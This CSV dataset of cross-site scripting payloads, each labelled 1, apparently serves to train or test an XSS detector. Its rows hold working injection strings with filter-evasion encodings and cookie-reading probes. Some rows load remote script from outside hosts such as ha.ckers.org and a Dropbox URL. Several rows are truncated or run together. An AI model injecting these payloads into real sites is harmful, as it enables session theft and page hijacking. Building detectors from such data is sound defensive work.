input,label
</script><script>alert('XSS');</script>,1
"</TITLE><SCRIPT>alert(""XSS"");</SCRIPT>",1
"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">",1
"<BODY BACKGROUND=""javascript:alert('XSS')"">",1
"<IMG DYNSRC=""javascript:alert('XSS')"">",1
"<IMG LOWSRC=""javascript:alert('XSS')"">",1
"<STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br>",1
"<IMG SRC='vbscript:msgbox(""XSS"")'>",1
"<IMG SRC=""livescript:[code]"">",1
<BODY ONLOAD=alert('XSS')>,1
"<BGSOUND SRC=""javascript:alert('XSS');"">",1
"<BR SIZE=""&{alert('XSS')}"">",1
"<LINK REL=""stylesheet"" HREF=""javascript:alert('XSS');"">",1
"<LINK REL=""stylesheet"" HREF=""http://ha.ckers.org/xss.css"">",1
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,1
"<META HTTP-EQUIV=""Link"" Content=""<http://ha.ckers.org/xss.css>; REL=stylesheet"">",1
"<STYLE>BODY{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>",1
"<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>",1
"<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">",1
"exp/*<A STYLE='no\xss:noxss(""*//*"");",1
"xss:ex/*XSS*//*/*/pression(alert(""XSS""))'>",1
"<STYLE TYPE=""text/javascript"">alert('XSS');</STYLE>",1
"<STYLE>.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A>",1
"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",1
"<XSS STYLE=""xss:expression(alert('XSS'))"">",1
"<XSS STYLE=""behavior: url(xss.htc);"">",1
¼script¾alert(¢XSS¢)¼/script¾,1
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert('XSS');"">",1
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html base64",1
"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:alert('XSS');"">",1
"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",1
"<IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>",1
"<FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>",1
"<TABLE BACKGROUND=""javascript:alert('XSS')"">",1
"<TABLE><TD BACKGROUND=""javascript:alert('XSS')"">",1
"<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">",1
"<DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">",1
"<DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))"">",1
"<DIV STYLE=""width: expression(alert('XSS'));"">",1
<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->,1
"<BASE HREF=""javascript:alert('XSS');//"">",1
"<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://ha.ckers.org/scriptlet.html""></OBJECT>",1
"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'""-->",1
"<? echo('<SCR)';echo('IPT>alert(""XSS"")</SCRIPT>'); ?>",1
"<IMG SRC=""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"">",1
"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>alert('XSS')</SCRIPT>"">",1
"<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",1
"<SCRIPT a="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<SCRIPT ="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<SCRIPT a="">"" '' SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<SCRIPT ""a='>'"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<SCRIPT a="">'>"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<A HREF=""http://66.102.7.147/"">XSS</A>",1
"0\""autofocus/onfocus=alert(1)--><video/poster/ error=prompt(2)>""-confirm(3)-""",1
veris-->group<svg/onload=alert(/XSS/)//,1
"#""><img src=M onerror=alert('XSS');>",1
element[attribute='<img src=x onerror=alert('XSS');>,1
"[<blockquote cite=""]"">["" onmouseover=""alert('RVRSH3LL_XSS');"" ]",1
%22;alert%28%27RVRSH3LL_XSS%29//,1
javascript:alert%281%29;,1
<w contenteditable id=x onfocus=alert()>,1
"alert;pg(""XSS"")",1
<svg/onload=%26%23097lert%26lpar;1337)>,1
<script>for((i)in(self))eval(i)(1)</script>,1
<scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt>,1
<sCR<script>iPt>alert(1)</SCr</script>IPt>,1
"<a href=""data:text/html;base64",1
%253Cscript%253Ealert('XSS')%253C%252Fscript%253E,1
"<META onpaonpageonpagonpageonpageshowshoweshowshowgeshow=""alert(1)"";",1
"<INPUT TYPE=""BUTTON"" action=""alert('XSS')""/>",1
"><h1><IFRAME SRC=javascript:alert('XSS');""></IFRAME>"">123</h1>",1
"><h1><IFRAME SRC=# onmouseover=alert(document.cookie)""></IFRAME>123</h1>",1
"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",1
"<IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>",1
"><h1><IFRAME SRC=# onmouseover=alert(document.cookie)""></IFRAME>123</h1>",1
></iframe><script>alert(`TEXT YOU WANT TO BE DISPLAYED`);</script><iframe frameborder=0%EF%BB%BF,1
"><h1><IFRAME width=420"" height=""315"" SRC=""http://www.youtube.com/embed/sxvccpasgTE"" frameborder=""0"" onmouseover=""alert(document.cookie)""></IFRAME>123</h1>",1
"><h1><iframe width=420"" height=""315"" src=""http://www.youtube.com/embed/sxvccpasgTE"" frameborder=""0"" allowfullscreen></iframe>123</h1>",1
"><h1><IFRAME width=""420"" height=""315"" frameborder=""0"" onmouseover=""document.location.href='https://www.youtube.com/channel/UC9Qa_gXarSmObPX3ooIQZr",1
"g'""></IFRAME>Hover the cursor to the LEFT of this Message</h1>&ParamHeight=250",1
"<IFRAME width=""420"" height=""315"" frameborder=""0"" onload=""alert(document.cookie)""></IFRAME>",1
"><h1><IFRAME SRC=javascript:alert('XSS');""></IFRAME>"">123</h1>",1
"><h1><IFRAME SRC=# onmouseover=alert(document.cookie)""></IFRAME>123</h1>",1
<iframe src=http://xss.rocks/scriptlet.html <,1
"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",1
"<IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>",1
"<iframe  src=""&Tab;javascript:prompt(1)&Tab;"">",1
<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>',1
"<input/onmouseover=""javaSCRIPT&colon;confirm&lpar;1&rpar;""",1
<sVg><scRipt >alert&lpar;1&rpar; {Opera},1
<img/src=`` onerror=this.onerror=confirm(1) ,1
"<form><isindex formaction=""javascript&colon;confirm(1)""",1
<img src=``&NewLine; onerror=alert(1)&NewLine;,1
<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>,1
<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?,1
"<iframe/src=""data:text/html;&Tab;base64&Tab;",1
<script /**/>/**/alert(1)/**/</script /**/,1
&#34;&#62;<h1/onmouseover='\u0061lert(1)'>,1
"<iframe/src=""data:text/html",1
"<meta content=""&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)"" http-equiv=""refresh""/>",1
<svg><script xlink:href=data&colon;,1
<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera},1
"<meta http-equiv=""refresh"" content=""0;url=javascript:confirm(1)"">",1
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>,1
"<form><a href=""javascript:\u0061lert&#x28;1&#x29;"">X</script><img/*/src=""worksinchrome&colon;prompt&#x28;1&#x29;""/*/onerror='eval(src)'>",1
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>,1
"<form><iframe &#09;&#10;&#11; src=""javascript&#58;alert(1)""&#11;&#10;&#09;;>",1
"<a href=""data:application/x-x509-user-cert;&NewLine;base64&NewLine;",1
http://www.google<script .com>alert(document.location)</script,1
"<a&#32;href&#61;&#91;&#00;&#93;""&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;"">XYZ</a",1
<img/src=@&#32;&#13; onerror = prompt('&#49;'),1
<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;,1
<script ^__^>alert(String.fromCharCode(49))</script ^__^,1
</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(,1
"&#00;</form><input type&#61;""date"" onfocus=""alert(1)"">",1
<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>,1
<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/,1
<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>,1
"<a href=""javascript:void(0)"" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>",1
<script ~~~>alert(0%0)</script ~~~>,1
<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>,1
<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN,1
<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1),1
&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>',1
&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera},1
<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^,1
"<div/style=""width:expression(confirm(1))"">X</div> {IE7}",1
<iframe// src=javaSCRIPT&colon;alert(1),1
//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//,1
"/*iframe/src*/<iframe/src=""<iframe/src=@""/onload=prompt(1) /*iframe/src*/>",1
//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\,1
</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>,1
"<a/href=""javascript:&#13; javascript:prompt(1)""><input type=""X"">",1
</plaintext\></|\><plaintext/onmouseover=prompt(1),1
</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera},1
"<a href=""javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;""><button>",1
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>,1
"<iframe style=""position:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"">",1
"<a href=""jAvAsCrIpT&colon;alert&lpar;1&rpar;"">X</a>",1
"<embed src=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">",1
"<object data=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">",1
"<var onmouseover=""prompt(1)"">On Mouse Over</var>",1
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>,1
"<img src=""/"" =_="" title=""onerror='prompt(1)'"">",1
<%<!--'%><script>alert(1);</script -->,1
"<script src=""data:text/javascript",1
<iframe/src \/\/onload = prompt(1),1
<iframe/onreadystatechange=alert(1),1
<svg/onload=alert(1),1
<input value=<><iframe/src=javascript:confirm(1),1
"<input type=""text"" value=`` <div/onmouseover='alert(1)'>X</div>",1
http://www.<script>alert(1)</script .com,1
<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>,1
<svg><script ?>alert(1),1
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>,1
<img src=`xx:xx`onerror=alert(1)>,1
"<object type=""text/x-scriptlet"" data=""http://jsfiddle.net/XLE63/ ""></object>",1
"<meta http-equiv=""refresh"" content=""0;javascript&colon;alert(1)""/>",1
"<math><a xlink:href=""//jsfiddle.net/t846h/"">click",1
"<embed code=""http://businessinfo.co.uk/labs/xss/xss.swf"" allowscriptaccess=always>",1
<svg contentScriptType=text/vbs><script>MsgBox+1,1
"<a href=""data:text/html;base64_",1
<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>,1
<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+,1
"<script/src=""data&colon;text%2Fj\u0061v\u0061script",1
<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,1
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>,1
<script>+-+-1-+-+alert(1)</script>,1
<body/onload=&lt;!--&gt;&#10alert(1)>,1
<script itworksinallbrowsers>/*<script* */alert(1)</script,1
<img src ?itworksonchrome?\/onerror = alert(1),1
<svg><script>//&NewLine;confirm(1);</script </svg>,1
<svg><script onlypossibleinopera:-)> alert(1),1
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe,1
<script x> alert(1) </script 1=2,1
"<div/onmouseover='alert(1)'> style=""x:"">",1
<--`<img/src=` onerror=alert(1)> --!>,1
<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,1
"<div style=""position:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"" onclick=""alert(1)"">x</button>",1
"><img src=x onerror=window.open('https://www.google.com/');>
<form><button formaction=javascript&colon;alert(1)>CLICKME
<math><a xlink:href=//jsfiddle.net/t846h/"">click",1
<object data=data:text/html;base64,1
"<iframe src=""data:text/html",1
"<a href=""data:text/html;blabla",1
"<script\x20type=""text/javascript"">javascript:alert(1);</script>",1
"<script\x3Etype=""text/javascript"">javascript:alert(1);</script>",1
"<script\x0Dtype=""text/javascript"">javascript:alert(1);</script>",1
"<script\x09type=""text/javascript"">javascript:alert(1);</script>",1
"<script\x0Ctype=""text/javascript"">javascript:alert(1);</script>",1
"<script\x2Ftype=""text/javascript"">javascript:alert(1);</script>",1
"<script\x0Atype=""text/javascript"">javascript:alert(1);</script>",1
"'`""><\x3Cscript>javascript:alert(1)</script>        ",1
"'`""><\x00script>javascript:alert(1)</script>",1
"<img src=1 href=1 onerror=""javascript:alert(1)""></img>",1
"<audio src=1 href=1 onerror=""javascript:alert(1)""></audio>",1
"<video src=1 href=1 onerror=""javascript:alert(1)""></video>",1
"<body src=1 href=1 onerror=""javascript:alert(1)""></body>",1
"<image src=1 href=1 onerror=""javascript:alert(1)""></image>",1
"<object src=1 href=1 onerror=""javascript:alert(1)""></object>",1
"<script src=1 href=1 onerror=""javascript:alert(1)""></script>",1
"<svg onResize svg onResize=""javascript:javascript:alert(1)""></svg onResize>",1
"<title onPropertyChange title onPropertyChange=""javascript:javascript:alert(1)""></title onPropertyChange>",1
"<iframe onLoad iframe onLoad=""javascript:javascript:alert(1)""></iframe onLoad>",1
"<body onMouseEnter body onMouseEnter=""javascript:javascript:alert(1)""></body onMouseEnter>",1
"<body onFocus body onFocus=""javascript:javascript:alert(1)""></body onFocus>",1
"<frameset onScroll frameset onScroll=""javascript:javascript:alert(1)""></frameset onScroll>",1
"<script onReadyStateChange script onReadyStateChange=""javascript:javascript:alert(1)""></script onReadyStateChange>",1
"<html onMouseUp html onMouseUp=""javascript:javascript:alert(1)""></html onMouseUp>",1
"<body onPropertyChange body onPropertyChange=""javascript:javascript:alert(1)""></body onPropertyChange>",1
"<svg onLoad svg onLoad=""javascript:javascript:alert(1)""></svg onLoad>",1
"<body onPageHide body onPageHide=""javascript:javascript:alert(1)""></body onPageHide>",1
"<body onMouseOver body onMouseOver=""javascript:javascript:alert(1)""></body onMouseOver>",1
"<body onUnload body onUnload=""javascript:javascript:alert(1)""></body onUnload>",1
"<body onLoad body onLoad=""javascript:javascript:alert(1)""></body onLoad>",1
"<bgsound onPropertyChange bgsound onPropertyChange=""javascript:javascript:alert(1)""></bgsound onPropertyChange>",1
"<html onMouseLeave html onMouseLeave=""javascript:javascript:alert(1)""></html onMouseLeave>",1
"<html onMouseWheel html onMouseWheel=""javascript:javascript:alert(1)""></html onMouseWheel>",1
"<style onLoad style onLoad=""javascript:javascript:alert(1)""></style onLoad>",1
"<iframe onReadyStateChange iframe onReadyStateChange=""javascript:javascript:alert(1)""></iframe onReadyStateChange>",1
"<body onPageShow body onPageShow=""javascript:javascript:alert(1)""></body onPageShow>",1
"<style onReadyStateChange style onReadyStateChange=""javascript:javascript:alert(1)""></style onReadyStateChange>",1
"<frameset onFocus frameset onFocus=""javascript:javascript:alert(1)""></frameset onFocus>",1
"<applet onError applet onError=""javascript:javascript:alert(1)""></applet onError>",1
"<marquee onStart marquee onStart=""javascript:javascript:alert(1)""></marquee onStart>",1
"<script onLoad script onLoad=""javascript:javascript:alert(1)""></script onLoad>",1
"<html onMouseOver html onMouseOver=""javascript:javascript:alert(1)""></html onMouseOver>",1
"<html onMouseEnter html onMouseEnter=""javascript:parent.javascript:alert(1)""></html onMouseEnter>",1
"<body onBeforeUnload body onBeforeUnload=""javascript:javascript:alert(1)""></body onBeforeUnload>",1
"<html onMouseDown html onMouseDown=""javascript:javascript:alert(1)""></html onMouseDown>",1
"<marquee onScroll marquee onScroll=""javascript:javascript:alert(1)""></marquee onScroll>",1
"<xml onPropertyChange xml onPropertyChange=""javascript:javascript:alert(1)""></xml onPropertyChange>",1
"<frameset onBlur frameset onBlur=""javascript:javascript:alert(1)""></frameset onBlur>",1
"<applet onReadyStateChange applet onReadyStateChange=""javascript:javascript:alert(1)""></applet onReadyStateChange>",1
"<svg onUnload svg onUnload=""javascript:javascript:alert(1)""></svg onUnload>",1
"<html onMouseOut html onMouseOut=""javascript:javascript:alert(1)""></html onMouseOut>",1
"<body onMouseMove body onMouseMove=""javascript:javascript:alert(1)""></body onMouseMove>",1
"<body onResize body onResize=""javascript:javascript:alert(1)""></body onResize>",1
"<object onError object onError=""javascript:javascript:alert(1)""></object onError>",1
"<body onPopState body onPopState=""javascript:javascript:alert(1)""></body onPopState>",1
"<html onMouseMove html onMouseMove=""javascript:javascript:alert(1)""></html onMouseMove>",1
"<applet onreadystatechange applet onreadystatechange=""javascript:javascript:alert(1)""></applet onreadystatechange>",1
"<body onpagehide body onpagehide=""javascript:javascript:alert(1)""></body onpagehide>",1
"<svg onunload svg onunload=""javascript:javascript:alert(1)""></svg onunload>",1
"<applet onerror applet onerror=""javascript:javascript:alert(1)""></applet onerror>",1
"<body onkeyup body onkeyup=""javascript:javascript:alert(1)""></body onkeyup>",1
"<body onunload body onunload=""javascript:javascript:alert(1)""></body onunload>",1
"<iframe onload iframe onload=""javascript:javascript:alert(1)""></iframe onload>",1
"<body onload body onload=""javascript:javascript:alert(1)""></body onload>",1
"<html onmouseover html onmouseover=""javascript:javascript:alert(1)""></html onmouseover>",1
"<object onbeforeload object onbeforeload=""javascript:javascript:alert(1)""></object onbeforeload>",1
"<body onbeforeunload body onbeforeunload=""javascript:javascript:alert(1)""></body onbeforeunload>",1
"<body onfocus body onfocus=""javascript:javascript:alert(1)""></body onfocus>",1
"<body onkeydown body onkeydown=""javascript:javascript:alert(1)""></body onkeydown>",1
"<iframe onbeforeload iframe onbeforeload=""javascript:javascript:alert(1)""></iframe onbeforeload>",1
"<iframe src iframe src=""javascript:javascript:alert(1)""></iframe src>",1
"<svg onload svg onload=""javascript:javascript:alert(1)""></svg onload>",1
"<html onmousemove html onmousemove=""javascript:javascript:alert(1)""></html onmousemove>",1
"<body onblur body onblur=""javascript:javascript:alert(1)""></body onblur>",1
\x3Cscript>javascript:alert(1)</script>,1
"'""`><script>/* *\x2Fjavascript:alert(1)// */</script>",1
<script>javascript:alert(1)</script\x0D,1
<script>javascript:alert(1)</script\x0A,1
<script>javascript:alert(1)</script\x0B,1
"<script charset=""\x22>javascript:alert(1)</script>",1
<!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->,1
--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->,1
--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1)> -->,1
--><!-- --\x21> <img src=xxx:x onerror=javascript:alert(1)> -->,1
--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->,1
"`""'><img src='#\x27 onerror=javascript:alert(1)>",1
"<a href=""javascript\x3Ajavascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"'`><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p>
<a href=javas\x00cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""javas\x07cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""javas\x0Dcript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""javas\x0Acript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""javas\x08cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""javas\x02cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""javas\x03cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""javas\x04cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""javas\x01cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""javas\x05cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""javas\x0Bcript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""javas\x09cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""javas\x06cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""javas\x0Ccript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
<script>/* *\x2A/javascript:alert(1)// */</script>,1
<script>/* *\x00/javascript:alert(1)// */</script>,1
"<style></style\x3E<img src=""about:blank"" onerror=javascript:alert(1)//></style>",1
"<style></style\x0D<img src=""about:blank"" onerror=javascript:alert(1)//></style>",1
"<style></style\x09<img src=""about:blank"" onerror=javascript:alert(1)//></style>",1
"<style></style\x20<img src=""about:blank"" onerror=javascript:alert(1)//></style>",1
"<style></style\x0A<img src=""about:blank"" onerror=javascript:alert(1)//></style>",1
"'`>ABC<div style=font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';"">DEF ",1
"'`>ABC<div style=font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';"">DEF ",1
"<script>if(""x\\xE1\x96\x89"".length==2) { javascript:alert(1);}</script>",1
"<script>if(""x\\xE0\xB9\x92"".length==2) { javascript:alert(1);}</script>",1
"<script>if(""x\\xEE\xA9\x93"".length==2) { javascript:alert(1);}</script>",1
"'`""><\x3Cscript>javascript:alert(1)</script>",1
"'`""><\x00script>javascript:alert(1)</script>",1
"'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>
'`><\x00img src=xxx:x onerror=javascript:alert(1)>",1
"<script src=""data:text/plain\x2Cjavascript:alert(1)""></script>",1
"<script src=""data:\xD4\x8F",1
"<script src=""data:\xE0\xA4\x98",1
"<script src=""data:\xCB\x8F",1
"<script\x20type=""text/javascript"">javascript:alert(1);</script>",1
"<script\x3Etype=""text/javascript"">javascript:alert(1);</script>",1
"<script\x0Dtype=""text/javascript"">javascript:alert(1);</script>",1
"<script\x09type=""text/javascript"">javascript:alert(1);</script>",1
"<script\x0Ctype=""text/javascript"">javascript:alert(1);</script>",1
"<script\x2Ftype=""text/javascript"">javascript:alert(1);</script>",1
"<script\x0Atype=""text/javascript"">javascript:alert(1);</script>",1
